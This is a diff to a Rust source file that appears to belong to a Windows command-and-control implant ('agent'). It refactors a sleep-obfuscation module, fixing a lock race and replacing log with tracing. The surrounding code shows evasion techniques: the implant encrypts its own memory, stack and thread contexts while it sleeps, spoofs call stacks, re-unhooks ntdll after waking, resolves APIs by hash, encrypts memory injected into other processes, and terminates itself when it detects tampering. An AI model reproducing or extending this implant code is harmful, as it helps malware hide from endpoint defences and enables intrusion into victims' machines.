@@ -27,6 +27,7 @@
 
 #![cfg(windows)]
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use chacha20::cipher::KeyIvInit;
 use chacha20poly1305::{
@@ -34,7 +35,6 @@ use chacha20poly1305::{
     XChaCha20Poly1305, XNonce,
 };
 use rand::RngCore;
-use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::OnceLock;
 use zeroize::Zeroize;
 
@@ -112,17 +112,23 @@ impl Drop for RegionSnapshot {
 unsafe impl Send for RegionSnapshot {}
 unsafe impl Sync for RegionSnapshot {}
 
-/// Global generation counter — incremented each time `secure_sleep` runs.
-/// The region cache is rebuilt when the generation changes or on first call.
-static REGION_GENERATION: AtomicU64 = AtomicU64::new(0);
+/// CRIT-006: Single lock-protected struct combining generation counter and
+/// cached region list.  Eliminates the TOCTOU window that existed when
+/// `REGION_GENERATION` (AtomicU64) and `REGION_CACHE` (Mutex) were separate
+/// statics — a thread could read the generation, get preempted, and then
+/// observe a stale cache after another thread updated both.
+struct RegionCacheEntry {
+    generation: u64,
+    regions: Vec<RegionSnapshot>,
+}
 
-/// Cached region list keyed by generation.  The `u64` is the generation at which
-/// the regions were enumerated; if the current generation has advanced past it,
-/// the cache is stale and must be refreshed.
-static REGION_CACHE: OnceLock<std::sync::Mutex<(u64, Vec<RegionSnapshot>)>> = OnceLock::new();
+static REGION_CACHE: OnceLock<std::sync::Mutex<RegionCacheEntry>> = OnceLock::new();
 
-fn region_cache() -> &'static std::sync::Mutex<(u64, Vec<RegionSnapshot>)> {
-    REGION_CACHE.get_or_init(|| std::sync::Mutex::new((0, Vec::new())))
+fn region_cache() -> &'static std::sync::Mutex<RegionCacheEntry> {
+    REGION_CACHE.get_or_init(|| std::sync::Mutex::new(RegionCacheEntry {
+        generation: 0,
+        regions: Vec::new(),
+    }))
 }
 
 // ── Sleep variant ────────────────────────────────────────────────────────────
@@ -167,7 +173,7 @@ pub fn set_sleep_variant(variant: SleepVariant) {
     let lock = runtime_variant();
     if let Ok(mut guard) = lock.lock() {
         *guard = Some(variant);
-        log::info!(
+        tracing::info!(
             "[sleep_obfuscation] runtime sleep variant set to {:?}",
             variant
         );
@@ -405,7 +411,7 @@ impl KeyHandle {
                 );
                 // This is a fatal error: we cannot safely proceed without
                 // confidence that the key is recoverable from NEON.
-                log::error!(
+                tracing::error!(
                     "[sleep_obfuscation] ARM64 NEON key stash verification FAILED — \
                      aborting to prevent key loss"
                 );
@@ -515,7 +521,7 @@ unsafe fn enumerate_regions(include_heap: bool) -> Vec<(*mut u8, usize, u32)> {
     // P2-01: Alignment check — function pointers must be properly aligned.
     // If the resolved address is not 8-byte aligned, skip to avoid UB.
     if func_addr % 8 != 0 {
-        log::warn!("[sleep_obfuscation] NtQueryVirtualMemory address {:#x} is not 8-byte aligned, skipping", func_addr);
+        tracing::warn!("[sleep_obfuscation] NtQueryVirtualMemory address {:#x} is not 8-byte aligned, skipping", func_addr);
         return regions;
     }
 
@@ -1299,7 +1305,7 @@ unsafe fn restore_call_stack(_handle: StackSpoofHandle) {
 /// Terminate the agent process immediately when AEAD verification fails
 /// (memory tampering detected).
 pub(crate) unsafe fn self_destruct() -> ! {
-    log::error!("[sleep_obfuscation] AEAD verification failed — self-destructing");
+    tracing::error!("[sleep_obfuscation] AEAD verification failed — self-destructing");
 
     // Try NtTerminateProcess first (avoids IAT hooks).
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
@@ -1808,7 +1814,14 @@ unsafe fn cronus_exec_xchacha20_stub(
 /// any other thread is accessing agent memory regions.
 pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     let duration = std::time::Duration::from_millis(config.sleep_duration_ms);
-    let gen = REGION_GENERATION.fetch_add(1, Ordering::SeqCst) + 1;
+
+    // CRIT-006: bump the generation inside the same lock that guards the
+    // cached region data, eliminating the TOCTOU window.
+    let gen = {
+        let mut cache = region_cache().lock_recover();
+        cache.generation += 1;
+        cache.generation
+    };
 
     // ── 1. Generate or use provided key ────────────────────────────────────
     let key = match config.encryption_key {
@@ -1824,7 +1837,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // ── 2. Enumerate regions (use cache if generation matches) ─────────────
     let raw_regions = enumerate_regions(config.encrypt_heap);
     if raw_regions.is_empty() {
-        log::warn!("[sleep_obfuscation] no regions to encrypt");
+        tracing::warn!("[sleep_obfuscation] no regions to encrypt");
         let _key = handle.retrieve();
         return Ok(());
     }
@@ -1842,11 +1855,11 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     if config.encrypt_thread_contexts {
         match unsafe { crate::thread_context_encrypt::capture_and_encrypt_thread_contexts(&key) } {
             Ok(snapshots) => {
-                log::debug!("[sleep_obfuscation] captured {} thread contexts", snapshots.len());
+                tracing::debug!("[sleep_obfuscation] captured {} thread contexts", snapshots.len());
                 thread_ctx_snapshots = Some(snapshots);
             }
             Err(e) => {
-                log::warn!("[sleep_obfuscation] thread context capture failed: {e:#}, continuing without");
+                tracing::warn!("[sleep_obfuscation] thread context capture failed: {e:#}, continuing without");
             }
         }
     }
@@ -1866,7 +1879,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
         let (nonce, tags) = match encrypt_region_chunks(&key, base, size) {
             Ok(r) => r,
             Err(e) => {
-                log::error!("[sleep_obfuscation] encrypt failed for {:p}: {}", base, e);
+                tracing::error!("[sleep_obfuscation] encrypt failed for {:p}: {}", base, e);
                 // Restore protection.
                 let _ = protect_memory(base, size, actual_old);
                 continue;
@@ -1947,11 +1960,11 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
         SleepVariant::Cronus => {
             // Auto-select: verify NtSetTimer resolves, fall back to Ekko.
             if cronus_probe() {
-                log::debug!("[sleep_obfuscation] using Cronus (waitable-timer) sleep");
+                tracing::debug!("[sleep_obfuscation] using Cronus (waitable-timer) sleep");
                 match cronus_sleep(duration) {
                     Ok(()) => {}
                     Err(e) => {
-                        log::warn!(
+                        tracing::warn!(
                             "[sleep_obfuscation] Cronus sleep failed: {e:#}, \
                              falling back to Ekko"
                         );
@@ -1976,7 +1989,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
                     }
                 }
             } else {
-                log::warn!(
+                tracing::warn!(
                     "[sleep_obfuscation] Cronus timer API not available, \
                      falling back to Ekko (NtDelayExecution)"
                 );
@@ -2030,7 +2043,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // Verify and decrypt all regions.
     for snap in &snapshots {
         if let Err(e) = decrypt_region_chunks(&key, snap.base, snap.size, &snap.nonce, &snap.tags) {
-            log::error!("[sleep_obfuscation] AEAD failure: {}", e);
+            tracing::error!("[sleep_obfuscation] AEAD failure: {}", e);
             // Self-destruct: AEAD tag mismatch means memory was tampered with.
             self_destruct();
         }
@@ -2071,10 +2084,10 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     if let Some(ref mut ctx_snaps) = thread_ctx_snapshots {
         match unsafe { crate::thread_context_encrypt::decrypt_and_restore_thread_contexts(&key, ctx_snaps) } {
             Ok(()) => {
-                log::debug!("[sleep_obfuscation] thread contexts restored successfully");
+                tracing::debug!("[sleep_obfuscation] thread contexts restored successfully");
             }
             Err(e) => {
-                log::error!("[sleep_obfuscation] thread context restore failed: {e:#}");
+                tracing::error!("[sleep_obfuscation] thread context restore failed: {e:#}");
                 // Non-fatal: threads may have corrupted state but we continue
                 // to avoid losing the agent entirely.
             }
@@ -2084,7 +2097,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     // ── 9. Decrypt stack ───────────────────────────────────────────────────
     if let Some((s_base, s_size, s_orig_prot, s_nonce, s_tag)) = stack_info {
         if let Err(e) = decrypt_stack(&key, s_base, s_size, &s_nonce, &s_tag) {
-            log::error!("[sleep_obfuscation] Stack AEAD failure: {}", e);
+            tracing::error!("[sleep_obfuscation] Stack AEAD failure: {}", e);
             self_destruct();
         }
         let _ = protect_memory(s_base, s_size, s_orig_prot);
@@ -2120,22 +2133,22 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     #[cfg(windows)]
     {
         if let Err(e) = crate::ntdll_unhook::maybe_unhook() {
-            log::warn!("[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}");
+            tracing::warn!("[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}");
         }
     }
 
     // Update region cache for potential reuse.
     {
-        let mut cache = region_cache().lock().unwrap();
-        cache.0 = gen;
-        cache.1 = snapshots;
+        let mut cache = region_cache().lock_recover();
+        cache.generation = gen;
+        cache.regions = snapshots;
     }
 
     // Zero the key from the stack.
     let mut key_zero = key;
     key_zero.zeroize();
 
-    log::debug!(
+    tracing::debug!(
         "[sleep_obfuscation] secure_sleep completed ({} ms)",
         config.sleep_duration_ms
     );
@@ -2433,7 +2446,7 @@ pub fn register_remote_process(
         cronos_stub_size: 0,
     };
 
-    let mut registry = remote_processes().lock().unwrap();
+    let mut registry = remote_processes().lock_recover();
 
     // Check for duplicate PID — replace existing entry.
     if let Some(existing) = registry.iter_mut().find(|r| r.pid == pid) {
@@ -2462,7 +2475,7 @@ pub fn register_remote_process(
         registry.push(entry);
     }
 
-    log::info!(
+    tracing::info!(
         "[sleep_obfuscation] registered remote process pid={} base={:#x} size={}",
         pid,
         base_addr,
@@ -2478,7 +2491,7 @@ pub fn register_remote_process(
 /// allocated, and removes the entry from the registry.
 /// Should be called before freeing injected memory in the target.
 pub fn unregister_remote_process(pid: u32) {
-    let mut registry = remote_processes().lock().unwrap();
+    let mut registry = remote_processes().lock_recover();
 
     let idx = registry.iter().position(|r| r.pid == pid);
     if let Some(i) = idx {
@@ -2505,7 +2518,7 @@ pub fn unregister_remote_process(pid: u32) {
             }
         }
 
-        log::info!(
+        tracing::info!(
             "[sleep_obfuscation] unregistered remote process pid={}",
             pid
         );
@@ -2518,7 +2531,7 @@ pub fn unregister_remote_process(pid: u32) {
 /// region is read, encrypted in-place, and written back.  The nonce and
 /// tags are stored in the registry entry for decryption on wake.
 unsafe fn encrypt_remote_regions() {
-    let mut registry = remote_processes().lock().unwrap();
+    let mut registry = remote_processes().lock_recover();
 
     for remote in registry.iter_mut() {
         let size = remote.size;
@@ -2526,7 +2539,7 @@ unsafe fn encrypt_remote_regions() {
 
         // Read the remote region.
         if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
-            log::warn!(
+            tracing::warn!(
                 "[sleep_obfuscation] failed to read remote pid={} base={:#x}",
                 remote.pid,
                 remote.base_addr
@@ -2590,7 +2603,7 @@ unsafe fn encrypt_remote_regions() {
 
         // Write encrypted data back to the remote process.
         if !remote_write(remote.process_handle, remote.base_addr, &buf) {
-            log::warn!(
+            tracing::warn!(
                 "[sleep_obfuscation] failed to write encrypted data to remote pid={}",
                 remote.pid
             );
@@ -2620,7 +2633,7 @@ unsafe fn encrypt_remote_regions() {
 /// Verifies AEAD tags for every chunk.  On failure, the remote process is
 /// terminated (tampered child = potential detection vector).
 unsafe fn decrypt_remote_regions() {
-    let registry = remote_processes().lock().unwrap();
+    let registry = remote_processes().lock_recover();
 
     for remote in registry.iter() {
         let size = remote.size;
@@ -2636,7 +2649,7 @@ unsafe fn decrypt_remote_regions() {
 
         // Read the encrypted data from the remote process.
         if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
-            log::error!(
+            tracing::error!(
                 "[sleep_obfuscation] failed to read encrypted remote pid={} — may be dead",
                 remote.pid
             );
@@ -2675,7 +2688,7 @@ unsafe fn decrypt_remote_regions() {
                     buf[offset..offset + pt.len()].copy_from_slice(&pt);
                 }
                 Err(_) => {
-                    log::error!(
+                    tracing::error!(
                         "[sleep_obfuscation] remote AEAD tag mismatch: pid={} chunk={} — \
                          terminating child process",
                         remote.pid,
@@ -2693,7 +2706,7 @@ unsafe fn decrypt_remote_regions() {
         if decrypt_ok {
             // Write decrypted data back.
             if !remote_write(remote.process_handle, remote.base_addr, &buf) {
-                log::error!(
+                tracing::error!(
                     "[sleep_obfuscation] failed to write decrypted data to remote pid={}",
                     remote.pid
                 );
